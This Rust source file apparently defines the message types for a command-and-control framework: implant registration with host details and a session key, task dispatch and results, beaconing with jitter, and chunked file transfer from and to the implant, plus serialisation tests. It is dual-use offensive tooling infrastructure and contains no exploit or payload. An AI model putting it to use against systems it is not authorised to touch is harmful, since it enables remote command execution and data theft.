use serde::{Deserialize, Serialize};
use uuid::Uuid;

use crate::control::CallbackCapabilities;

/// Sent inside a Register envelope (encrypted) by implant -> server.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Register {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub addr: String,
    #[serde(default)]
    pub os_version: Option<String>,
    #[serde(default)]
    pub executable_path: Option<String>,
    #[serde(default)]
    pub local_addr: Option<String>,
    #[serde(default)]
    pub implant_version: Option<String>,
    #[serde(default)]
    pub interval_ms: Option<u64>,
    #[serde(default)]
    pub jitter_ms: Option<u64>,
    #[serde(default)]
    pub capabilities: Option<CallbackCapabilities>,
    /// The AES-256 session key to use after handshake, base64. In a full-
    /// forward-secrecy build this is an x25519 public key; M1 uses a
    /// pre-shared profile key so this is the derived session key.
    pub session_key: String,
}

/// Encrypted response to Register: server confirms session id + its ephemeral
/// x25519 public key so the implant can derive the shared session key.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterAck {
    pub session_id: Uuid,
    /// Server's ephemeral x25519 public key, base64. The implant DH's this
    /// against its own ephemeral secret to derive the per-session key.
    pub server_pub: String,
}

/// A command to run. Sent server -> implant inside Task envelope.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Task {
    pub id: Uuid,
    pub command: String,
    pub args: Vec<String>,
    pub timeout_ms: u64,
}

/// Result of a Task. Sent implant -> server inside TaskResult envelope.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResult {
    pub task_id: Uuid,
    pub ok: bool,
    pub stdout: Vec<u8>,
    pub stderr: Vec<u8>,
    pub exit_code: i32,
}

/// One poll: implant reports completed result ids (already acked) and asks
/// for new tasks. File download chunks ride in the same request so a large
/// file streams over consecutive beacons (see the `nw/download` task).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PollRequest {
    pub results: Vec<TaskResult>,
    /// Legacy alias for accepted task ids. Kept for older implants/servers.
    #[serde(default)]
    pub acked_ids: Vec<Uuid>,
    /// Task ids accepted by the implant. The server advances only owned tasks.
    #[serde(default)]
    pub accepted_task_ids: Vec<Uuid>,
    /// Download chunks (implant -> server) for the active file transfer.
    pub file_chunks: Vec<FileChunk>,
    /// Confirmations (implant -> server) for the active server->implant upload.
    pub upload_acks: Vec<FileAck>,
    /// The implant's per-frame inner budget, so the server sizes upload pushes
    /// to fit the tightest (DNS) transport without overflow.
    pub inner_budget: usize,
}

/// Server reply to a poll: new tasks, download acks (resume points) for the
/// active download, and any server->implant upload chunks to write.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PollReply {
    pub tasks: Vec<Task>,
    /// Result ids durably stored by the server and safe to drop client-side.
    #[serde(default)]
    pub result_acks: Vec<Uuid>,
    pub acks: Vec<FileAck>,
    /// Upload chunks (server -> implant) for the active upload transfer.
    pub push_chunks: Vec<FileChunk>,
}

/// One chunk of a file streaming from the implant to the server.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileChunk {
    /// Remote basename — the server's storage key for the transfer.
    pub name: String,
    /// Absolute byte offset of this chunk in the file.
    pub offset: u64,
    /// Total source file size (set on every chunk for out-of-band info).
    pub total: u64,
    /// Raw chunk bytes.
    pub data: Vec<u8>,
}

/// Server -> implant progress on the active file transfer.
#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
pub struct FileAck {
    /// Highest contiguous byte offset the server has persisted for this file.
    pub received: u64,
    /// Total bytes the server expects (echoed from FileChunk.total).
    pub total: u64,
    /// True once received == total (server has the whole file).
    pub done: bool,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn messages_serialize() {
        let t = Task {
            id: Uuid::new_v4(),
            command: "whoami".into(),
            args: vec![],
            timeout_ms: 1000,
        };
        let j = serde_json::to_string(&t).unwrap();
        let back: Task = serde_json::from_str(&j).unwrap();
        assert_eq!(back.command, "whoami");
    }

    #[test]
    fn legacy_register_shape_deserializes_without_workspace_metadata() {
        let legacy = serde_json::json!({
            "hostname": "legacy-host",
            "username": "legacy-user",
            "os": "linux",
            "arch": "x86_64",
            "pid": 42,
            "addr": "10.0.0.8",
            "session_key": "legacy-key"
        });

        let register: Register = serde_json::from_value(legacy).unwrap();

        assert_eq!(register.hostname, "legacy-host");
        assert_eq!(register.addr, "10.0.0.8");
        assert!(register.os_version.is_none());
        assert!(register.executable_path.is_none());
        assert!(register.local_addr.is_none());
        assert!(register.implant_version.is_none());
        assert!(register.interval_ms.is_none());
        assert!(register.jitter_ms.is_none());
        assert!(register.capabilities.is_none());
    }

    #[test]
    fn legacy_polls_default_new_ack_fields() {
        let request: PollRequest = serde_json::from_str(
            r#"{"results":[],"acked_ids":[],"file_chunks":[],"upload_acks":[],"inner_budget":0}"#,
        )
        .unwrap();
        assert!(request.accepted_task_ids.is_empty());

        let reply: PollReply =
            serde_json::from_str(r#"{"tasks":[],"acks":[],"push_chunks":[]}"#).unwrap();
        assert!(reply.result_acks.is_empty());
    }
}
